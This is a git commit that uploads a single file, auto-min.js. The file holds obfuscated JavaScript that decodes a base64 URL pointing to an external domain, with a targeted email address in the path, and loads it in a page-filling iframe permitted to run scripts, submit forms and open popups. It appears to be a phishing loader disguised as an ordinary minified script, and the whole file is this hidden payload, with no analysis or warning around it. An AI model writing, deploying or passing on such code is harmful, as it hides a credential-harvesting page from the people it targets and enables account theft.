298eaa97faa14a4d0ab93ed7bee9585d2bd30903
dani222388 <daneil.tensfeldt@gmail.com>
2025-07-28 07:45:35 -0700

    Add files via upload

---
+++ auto-min.js
@@ -0,0 +1,45 @@
+function _0x4873() {
+  const _0x383399 = [
+    "1318572zOAqgy", "div", "sandbox", "4911414pZgFIS", "setAttribute",
+    "lazy", "5lDnLRu", "1768974SMTkHi", "createElement",
+    "allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox",
+    "appendChild", "792qaaEwD", "775474xThkgK", "114661zddctR",
+    "3152040RDMrDE", "4oYWPmn", "83817VxSDBg", "11vLDXhf"
+  ];
+  _0x4873 = function () { return _0x383399; };
+  return _0x4873();
+}
+const _0x41f8e9 = _0x2b68;
+function _0x2b68(_0x5a04e1, _0x5927af) {
+  const _0x487319 = _0x4873();
+  return (_0x2b68 = function (_0x2b6824, _0x3b9cec) {
+    _0x2b6824 = _0x2b6824 - 0x179;
+    let _0x47a439 = _0x487319[_0x2b6824];
+    return _0x47a439;
+  }), _0x2b68(_0x5a04e1, _0x5927af);
+}
+(function (_0x38f289, _0x2706ed) {
+  const _0xf07dbb = _0x2b68, _0x4b0e0d = _0x38f289();
+  while (!![]) {
+    try {
+      const _0x4309c4 = -parseInt(_0xf07dbb(0x183)) / 0x1 + parseInt(_0xf07dbb(0x188)) / 0x2
+        + (parseInt(_0xf07dbb(0x17d)) / 0x3) * (-parseInt(_0xf07dbb(0x185)) / 0x4)
+        + (-parseInt(_0xf07dbb(0x17c)) / 0x5) * (parseInt(_0xf07dbb(0x179)) / 0x6)
+        + parseInt(_0xf07dbb(0x182)) / 0x7 + (parseInt(_0xf07dbb(0x181)) / 0x8)
+        * (parseInt(_0xf07dbb(0x186)) / 0x9) + (-parseInt(_0xf07dbb(0x184)) / 0xa)
+        * (-parseInt(_0xf07dbb(0x187)) / 0xb);
+      if (_0x4309c4 === _0x2706ed) break;
+      else _0x4b0e0d["push"](_0x4b0e0d["shift"]());
+    } catch (_0x2d753d) {
+      _0x4b0e0d["push"](_0x4b0e0d["shift"]());
+    }
+  }
+})(_0x4873, 0x76413);
+const wrapper = document[_0x41f8e9(0x17e)](_0x41f8e9(0x189));
+wrapper["className"] = "wrapper";
+const iframe = document[_0x41f8e9(0x17e)]("iframe");
+iframe["src"] = atob("aHR0cHM6Ly90ZW5jbG91ZGVycy5vbmxpbmUvdXNlci9CaWxseUJAYXV0b21vdGlvbnBhcmtpbmcuY29tLw==");
+iframe["loading"] = _0x41f8e9(0x17b);
+iframe[_0x41f8e9(0x17a)](_0x41f8e9(0x18a), _0x41f8e9(0x17f));
+wrapper[_0x41f8e9(0x180)](iframe);
+document["body"]["appendChild"](wrapper);
